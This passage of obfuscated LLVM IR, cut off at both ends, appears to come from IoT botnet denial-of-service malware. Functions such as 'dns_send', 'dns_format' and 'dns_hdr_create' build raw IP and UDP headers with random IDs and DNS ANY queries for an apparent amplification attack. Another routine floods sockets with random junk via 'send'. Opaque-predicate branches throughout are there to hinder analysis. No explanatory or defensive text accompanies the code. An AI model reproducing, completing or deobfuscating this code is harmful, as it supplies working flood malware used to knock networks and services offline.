  store i32 %181, i32* %21, align 4
  %182 = load i32, i32* @x.101
  %183 = load i32, i32* @y.102
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %190

; <label>:190:                                    ; preds = %originalBBpart212
  br label %191

; <label>:191:                                    ; preds = %190
  %192 = load i32, i32* %8, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %193
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 8
  %197 = srem i32 %196, 64
  %198 = zext i32 %197 to i64
  %199 = shl i64 1, %198
  %200 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %201 = load i32, i32* %8, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %202
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 8
  %206 = sdiv i32 %205, 64
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [16 x i64], [16 x i64]* %200, i64 0, i64 %207
  %209 = load i64, i64* %208, align 8
  %210 = or i64 %209, %199
  store i64 %210, i64* %208, align 8
  %211 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %211, align 8
  %212 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %212, align 8
  %213 = load i32, i32* %8, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %214
  %216 = getelementptr inbounds %struct.state_t, %struct.state_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 8
  %218 = add nsw i32 %217, 1
  %219 = call i32 @select(i32 %218, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %219, i32* %15, align 4
  %220 = load i32, i32* %15, align 4
  %221 = icmp eq i32 %220, 1
  br i1 %221, label %222, label %249

; <label>:222:                                    ; preds = %191
  store i32 4, i32* %13, align 4
  %223 = load i32, i32* %8, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %224
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 8
  %228 = bitcast i32* %14 to i8*
  %229 = call i32 @getsockopt(i32 %227, i32 1, i32 4, i8* %228, i32* %13) #2
  %230 = load i32, i32* %14, align 4
  %231 = icmp ne i32 %230, 0
  br i1 %231, label %232, label %243

; <label>:232:                                    ; preds = %222
  %233 = load i32, i32* %8, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %234
  %236 = getelementptr inbounds %struct.state_t, %struct.state_t* %235, i32 0, i32 0
  %237 = load i32, i32* %236, align 8
  %238 = call i32 @close(i32 %237)
  %239 = load i32, i32* %8, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %240
  %242 = getelementptr inbounds %struct.state_t, %struct.state_t* %241, i32 0, i32 1
  store i8 0, i8* %242, align 4
  br label %248

; <label>:243:                                    ; preds = %222
  %244 = load i32, i32* %8, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %245
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %246, i32 0, i32 1
  store i8 2, i8* %247, align 4
  br label %248

; <label>:248:                                    ; preds = %243, %232
  br label %264

; <label>:249:                                    ; preds = %191
  %250 = load i32, i32* %15, align 4
  %251 = icmp eq i32 %250, -1
  br i1 %251, label %252, label %263

; <label>:252:                                    ; preds = %249
  %253 = load i32, i32* %8, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %254
  %256 = getelementptr inbounds %struct.state_t, %struct.state_t* %255, i32 0, i32 0
  %257 = load i32, i32* %256, align 8
  %258 = call i32 @close(i32 %257)
  %259 = load i32, i32* %8, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %260
  %262 = getelementptr inbounds %struct.state_t, %struct.state_t* %261, i32 0, i32 1
  store i8 0, i8* %262, align 4
  br label %263

; <label>:263:                                    ; preds = %252, %249
  br label %264

; <label>:264:                                    ; preds = %263, %248
  br label %327

; <label>:265:                                    ; preds = %78
  %266 = call i32 @realrand(i32 32, i32 1024)
  store i32 %266, i32* %17, align 4
  %267 = load i8*, i8** %16, align 8
  %268 = load i32, i32* %17, align 4
  call void @makeRandomShit(i8* %267, i32 %268)
  %269 = load i32, i32* %8, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %270
  %272 = getelementptr inbounds %struct.state_t, %struct.state_t* %271, i32 0, i32 0
  %273 = load i32, i32* %272, align 8
  %274 = load i8*, i8** %16, align 8
  %275 = load i32, i32* %17, align 4
  %276 = sext i32 %275 to i64
  %277 = call i64 @send(i32 %273, i8* %274, i64 %276, i32 16384)
  %278 = icmp eq i64 %277, -1
  br i1 %278, label %279, label %310

; <label>:279:                                    ; preds = %265
  %280 = call i32* @__errno_location() #13
  %281 = load i32, i32* %280, align 4
  %282 = icmp ne i32 %281, 11
  br i1 %282, label %283, label %310

; <label>:283:                                    ; preds = %279
  %284 = load i32, i32* @x.101
  %285 = load i32, i32* @y.102
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %283
  %292 = load i32, i32* %8, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %293
  %295 = getelementptr inbounds %struct.state_t, %struct.state_t* %294, i32 0, i32 0
  %296 = load i32, i32* %295, align 8
  %297 = call i32 @close(i32 %296)
  %298 = load i32, i32* %8, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %299
  %301 = getelementptr inbounds %struct.state_t, %struct.state_t* %300, i32 0, i32 1
  store i8 0, i8* %301, align 4
  %302 = load i32, i32* @x.101
  %303 = load i32, i32* @y.102
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %310

; <label>:310:                                    ; preds = %originalBBpart216, %279, %265
  %311 = load i32, i32* @x.101
  %312 = load i32, i32* @y.102
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %310
  %319 = load i32, i32* @x.101
  %320 = load i32, i32* @y.102
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %327

; <label>:327:                                    ; preds = %originalBBpart220, %264, %147, %78
  br label %328

; <label>:328:                                    ; preds = %327
  %329 = load i32, i32* %8, align 4
  %330 = add nsw i32 %329, 1
  store i32 %330, i32* %8, align 4
  br label %58

; <label>:331:                                    ; preds = %originalBBpart2
  br label %52

; <label>:332:                                    ; preds = %52
  %333 = load i32, i32* @x.101
  %334 = load i32, i32* @y.102
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %332
  %341 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %341)
  %342 = load i32, i32* @x.101
  %343 = load i32, i32* @y.102
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %350

; <label>:350:                                    ; preds = %originalBBpart224, %33
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %58
  %351 = load i32, i32* %8, align 4
  %352 = load i32, i32* %7, align 4
  %353 = icmp slt i32 %351, %352
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %119
  %354 = load i32, i32* %8, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %355
  %357 = getelementptr inbounds %struct.state_t, %struct.state_t* %356, i32 0, i32 0
  %358 = load i32, i32* %357, align 8
  %359 = call i32 @close(i32 %358)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %148
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %165
  %360 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %361 = getelementptr inbounds [16 x i64], [16 x i64]* %360, i64 0, i64 0
  %362 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %361) #2, !srcloc !9
  %363 = extractvalue { i64, i64* } %362, 0
  %364 = extractvalue { i64, i64* } %362, 1
  %365 = trunc i64 %363 to i32
  store i32 %365, i32* %20, align 4
  %366 = ptrtoint i64* %364 to i64
  %367 = trunc i64 %366 to i32
  store i32 %367, i32* %21, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %283
  %368 = load i32, i32* %8, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %369
  %371 = getelementptr inbounds %struct.state_t, %struct.state_t* %370, i32 0, i32 0
  %372 = load i32, i32* %371, align 8
  %373 = call i32 @close(i32 %372)
  %374 = load i32, i32* %8, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %375
  %377 = getelementptr inbounds %struct.state_t, %struct.state_t* %376, i32 0, i32 1
  store i8 0, i8* %377, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %310
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %332
  %378 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %378)
  br label %originalBB22
}

; Function Attrs: noinline nounwind uwtable
define void @dns_format(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  store i32 0, i32* %5, align 4
  %7 = load i8*, i8** %4, align 8
  %8 = call i8* @strcat(i8* %7, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #2
  store i32 0, i32* %6, align 4
  br label %9

; <label>:9:                                      ; preds = %129, %2
  %10 = load i32, i32* @x.103
  %11 = load i32, i32* @y.104
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i32, i32* %6, align 4
  %19 = sext i32 %18 to i64
  %20 = load i8*, i8** %4, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = icmp ult i64 %19, %21
  %23 = load i32, i32* @x.103
  %24 = load i32, i32* @y.104
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %132

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.103
  %33 = load i32, i32* @y.104
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = load i8*, i8** %4, align 8
  %41 = load i32, i32* %6, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 46
  %47 = load i32, i32* @x.103
  %48 = load i32, i32* @y.104
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %46, label %55, label %112

; <label>:55:                                     ; preds = %originalBBpart24
  %56 = load i32, i32* @x.103
  %57 = load i32, i32* @y.104
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  %64 = load i32, i32* %6, align 4
  %65 = load i32, i32* %5, align 4
  %66 = sub nsw i32 %64, %65
  %67 = trunc i32 %66 to i8
  %68 = load i8*, i8** %3, align 8
  %69 = getelementptr inbounds i8, i8* %68, i32 1
  store i8* %69, i8** %3, align 8
  store i8 %67, i8* %68, align 1
  %70 = load i32, i32* @x.103
  %71 = load i32, i32* @y.104
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br label %78

; <label>:78:                                     ; preds = %106, %originalBBpart216
  %79 = load i32, i32* @x.103
  %80 = load i32, i32* @y.104
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %78
  %87 = load i32, i32* %5, align 4
  %88 = load i32, i32* %6, align 4
  %89 = icmp slt i32 %87, %88
  %90 = load i32, i32* @x.103
  %91 = load i32, i32* @y.104
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %89, label %98, label %109

; <label>:98:                                     ; preds = %originalBBpart220
  %99 = load i8*, i8** %4, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = load i8*, i8** %3, align 8
  %105 = getelementptr inbounds i8, i8* %104, i32 1
  store i8* %105, i8** %3, align 8
  store i8 %103, i8* %104, align 1
  br label %106

; <label>:106:                                    ; preds = %98
  %107 = load i32, i32* %5, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %5, align 4
  br label %78

; <label>:109:                                    ; preds = %originalBBpart220
  %110 = load i32, i32* %5, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %5, align 4
  br label %112

; <label>:112:                                    ; preds = %109, %originalBBpart24
  %113 = load i32, i32* @x.103
  %114 = load i32, i32* @y.104
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %112
  %121 = load i32, i32* @x.103
  %122 = load i32, i32* @y.104
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %129

; <label>:129:                                    ; preds = %originalBBpart224
  %130 = load i32, i32* %6, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %6, align 4
  br label %9

; <label>:132:                                    ; preds = %originalBBpart2
  %133 = load i8*, i8** %3, align 8
  %134 = getelementptr inbounds i8, i8* %133, i32 1
  store i8* %134, i8** %3, align 8
  store i8 0, i8* %133, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %9
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = load i8*, i8** %4, align 8
  %138 = call i64 @strlen(i8* %137) #10
  %139 = icmp ult i64 %136, %138
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %140 = load i8*, i8** %4, align 8
  %141 = load i32, i32* %6, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i8, i8* %140, i64 %142
  %144 = load i8, i8* %143, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 46
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  %147 = load i32, i32* %6, align 4
  %148 = load i32, i32* %5, align 4
  %_ = sub i32 %147, %148
  %gen = mul i32 %_, %148
  %_7 = sub i32 %147, %148
  %gen8 = mul i32 %_7, %148
  %_9 = sub i32 %147, %148
  %gen10 = mul i32 %_9, %148
  %_11 = sub i32 %147, %148
  %gen12 = mul i32 %_11, %148
  %_13 = sub i32 %147, %148
  %gen14 = mul i32 %_13, %148
  %149 = sub nsw i32 %147, %148
  %150 = trunc i32 %149 to i8
  %151 = load i8*, i8** %3, align 8
  %152 = getelementptr inbounds i8, i8* %151, i32 1
  store i8* %152, i8** %3, align 8
  store i8 %150, i8* %151, align 1
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %78
  %153 = load i32, i32* %5, align 4
  %154 = load i32, i32* %6, align 4
  %155 = icmp slt i32 %153, %154
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %112
  br label %originalBB22
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @dns_hdr_create(%struct.dns_hdr*) #0 {
  %2 = load i32, i32* @x.105
  %3 = load i32, i32* @y.106
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.dns_hdr*, align 8
  store %struct.dns_hdr* %0, %struct.dns_hdr** %10, align 8
  %11 = call i32 @getpid() #2
  %12 = trunc i32 %11 to i16
  %13 = call zeroext i16 @htons(i16 zeroext %12) #13
  %14 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  %15 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %14, i32 0, i32 0
  store i16 %13, i16* %15, align 2
  %16 = call zeroext i16 @htons(i16 zeroext 256) #13
  %17 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  %18 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %17, i32 0, i32 1
  store i16 %16, i16* %18, align 2
  %19 = call zeroext i16 @htons(i16 zeroext 1) #13
  %20 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  %21 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %20, i32 0, i32 2
  store i16 %19, i16* %21, align 2
  %22 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  %23 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %22, i32 0, i32 3
  store i16 0, i16* %23, align 2
  %24 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  %25 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %24, i32 0, i32 4
  store i16 0, i16* %25, align 2
  %26 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  %27 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %26, i32 0, i32 5
  store i16 0, i16* %27, align 2
  %28 = load i32, i32* @x.105
  %29 = load i32, i32* @y.106
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %36 = alloca %struct.dns_hdr*, align 8
  store %struct.dns_hdr* %0, %struct.dns_hdr** %36, align 8
  %37 = call i32 @getpid() #2
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #13
  %40 = load %struct.dns_hdr*, %struct.dns_hdr** %36, align 8
  %41 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %40, i32 0, i32 0
  store i16 %39, i16* %41, align 2
  %42 = call zeroext i16 @htons(i16 zeroext 256) #13
  %43 = load %struct.dns_hdr*, %struct.dns_hdr** %36, align 8
  %44 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %43, i32 0, i32 1
  store i16 %42, i16* %44, align 2
  %45 = call zeroext i16 @htons(i16 zeroext 1) #13
  %46 = load %struct.dns_hdr*, %struct.dns_hdr** %36, align 8
  %47 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %46, i32 0, i32 2
  store i16 %45, i16* %47, align 2
  %48 = load %struct.dns_hdr*, %struct.dns_hdr** %36, align 8
  %49 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %48, i32 0, i32 3
  store i16 0, i16* %49, align 2
  %50 = load %struct.dns_hdr*, %struct.dns_hdr** %36, align 8
  %51 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %50, i32 0, i32 4
  store i16 0, i16* %51, align 2
  %52 = load %struct.dns_hdr*, %struct.dns_hdr** %36, align 8
  %53 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %52, i32 0, i32 5
  store i16 0, i16* %53, align 2
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @dns_send(i8*, i32, i8*, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [128 x i8], align 16
  %10 = alloca %struct.dns_hdr*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca [32 x i8], align 16
  %13 = alloca %struct.query*, align 8
  %14 = alloca [4096 x i8], align 16
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.udphdr*, align 8
  %20 = alloca %struct.ps_hdr, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  %24 = bitcast [128 x i8]* %9 to %struct.dns_hdr*
  store %struct.dns_hdr* %24, %struct.dns_hdr** %10, align 8
  %25 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  call void @dns_hdr_create(%struct.dns_hdr* %25)
  %26 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 12
  store i8* %26, i8** %11, align 8
  %27 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i32 0, i32 0
  %28 = load i8*, i8** %8, align 8
  %29 = call i8* @strcpy(i8* %27, i8* %28) #2
  %30 = load i8*, i8** %11, align 8
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i32 0, i32 0
  call void @dns_format(i8* %30, i8* %31)
  %32 = load i8*, i8** %11, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = add i64 %33, 1
  %35 = add i64 12, %34
  %36 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 %35
  %37 = bitcast i8* %36 to %struct.query*
  store %struct.query* %37, %struct.query** %13, align 8
  %38 = call zeroext i16 @htons(i16 zeroext 255) #13
  %39 = load %struct.query*, %struct.query** %13, align 8
  %40 = getelementptr inbounds %struct.query, %struct.query* %39, i32 0, i32 0
  store i16 %38, i16* %40, align 2
  %41 = call zeroext i16 @htons(i16 zeroext 1) #13
  %42 = load %struct.query*, %struct.query** %13, align 8
  %43 = getelementptr inbounds %struct.query, %struct.query* %42, i32 0, i32 1
  store i16 %41, i16* %43, align 2
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 4096, i32 16, i1 false)
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %46 = getelementptr inbounds i8, i8* %45, i64 20
  %47 = getelementptr inbounds i8, i8* %46, i64 8
  store i8* %47, i8** %15, align 8
  %48 = load i8*, i8** %15, align 8
  %49 = bitcast [128 x i8]* %9 to i8*
  %50 = load i8*, i8** %11, align 8
  %51 = call i64 @strlen(i8* %50) #10
  %52 = add i64 %51, 1
  %53 = add i64 12, %52
  %54 = add i64 %53, 4
  %55 = add i64 %54, 1
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %48, i8* %49, i64 %55, i32 1, i1 false)
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext 53) #13
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  %59 = load i8*, i8** %7, align 8
  %60 = call i32 @inet_addr(i8* %59) #2
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %62 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %61, i32 0, i32 0
  store i32 %60, i32* %62, align 4
  %63 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %64 = bitcast i8* %63 to %struct.iphdr*
  store %struct.iphdr* %64, %struct.iphdr** %18, align 8
  %65 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %66 = bitcast %struct.iphdr* %65 to i8*
  %67 = load i8, i8* %66, align 4
  %68 = and i8 %67, 15
  %69 = or i8 %68, 64
  store i8 %69, i8* %66, align 4
  %70 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %71 = bitcast %struct.iphdr* %70 to i8*
  %72 = load i8, i8* %71, align 4
  %73 = and i8 %72, -16
  %74 = or i8 %73, 5
  store i8 %74, i8* %71, align 4
  %75 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %76 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %75, i32 0, i32 1
  store i8 0, i8* %76, align 1
  %77 = load i8*, i8** %11, align 8
  %78 = call i64 @strlen(i8* %77) #10
  %79 = add i64 %78, 1
  %80 = add i64 40, %79
  %81 = add i64 %80, 4
  %82 = trunc i64 %81 to i16
  %83 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %84 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %83, i32 0, i32 2
  store i16 %82, i16* %84, align 2
  %85 = call i32 @rand_cmwc()
  %86 = call i32 @htonl(i32 %85) #13
  %87 = trunc i32 %86 to i16
  %88 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i32 0, i32 3
  store i16 %87, i16* %89, align 4
  %90 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %91 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %90, i32 0, i32 4
  store i16 0, i16* %91, align 2
  %92 = load %struct.iphdr*, %struct.iphdr** %18, align 8
